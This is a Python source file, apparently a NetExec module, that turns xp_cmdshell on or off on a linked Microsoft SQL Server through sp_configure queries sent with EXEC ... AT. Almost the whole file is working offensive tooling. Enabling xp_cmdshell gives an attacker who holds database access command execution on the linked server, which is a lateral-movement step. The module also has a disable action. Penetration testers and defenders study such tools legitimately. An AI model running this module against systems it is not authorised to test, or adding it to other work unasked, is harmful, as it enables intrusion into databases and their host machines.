#Author: 
# deathflamingo
class NXCModule:
    """Enable or disable xp_cmdshell on a linked SQL server"""

    name = "link_enable_xp"
    description = "Enable or disable xp_cmdshell on a linked SQL server"
    supported_protocols = ["mssql"]
    opsec_safe = False
    multiple_hosts = False

    def __init__(self):
        self.action = None
        self.linked_server = None

    def options(self, context, module_options):
        """
        Defines the options for enabling or disabling xp_cmdshell on the linked server.
        ACTION    Specifies whether to enable or disable:
                  - enable (default)
                  - disable
        LINKED_SERVER    The name of the linked SQL server to target.
        """
        self.action = module_options.get("ACTION", "enable")
        self.linked_server = module_options.get("LINKED_SERVER")

    def on_login(self, context, connection):
        self.context = context
        self.mssql_conn = connection.conn
        if not self.linked_server:
            self.context.log.fail("Please provide a linked server name using the LINKED_SERVER option.")
            return

        # Enable or disable xp_cmdshell based on action
        if self.action == "enable":
            self.enable_xp_cmdshell()
        elif self.action == "disable":
            self.disable_xp_cmdshell()
        else:
            self.context.log.fail(f"Unknown action: {self.action}")

    def enable_xp_cmdshell(self):
        """Enable xp_cmdshell on the linked server."""
        query = f"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{self.linked_server}]"
        self.context.log.display(f"Enabling advanced options on {self.linked_server}...")
        out=self.query_and_get_output(query)
        query = f"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{self.linked_server}]"
        self.context.log.display(f"Enabling xp_cmdshell on {self.linked_server}...")
        out=self.query_and_get_output(query)
        self.context.log.display(out)
        self.context.log.success(f"xp_cmdshell enabled on {self.linked_server}")

    def disable_xp_cmdshell(self):
        """Disable xp_cmdshell on the linked server."""
        query = f"EXEC ('sp_configure ''xp_cmdshell'', 0; RECONFIGURE; sp_configure ''show advanced options'', 0; RECONFIGURE;') AT [{self.linked_server}]"
        self.context.log.display(f"Disabling xp_cmdshell on {self.linked_server}...")
        self.query_and_get_output(query)
        self.context.log.success(f"xp_cmdshell disabled on {self.linked_server}")

    def query_and_get_output(self, query):
        """Executes a query and returns the output."""
        return self.mssql_conn.sql_query(query)
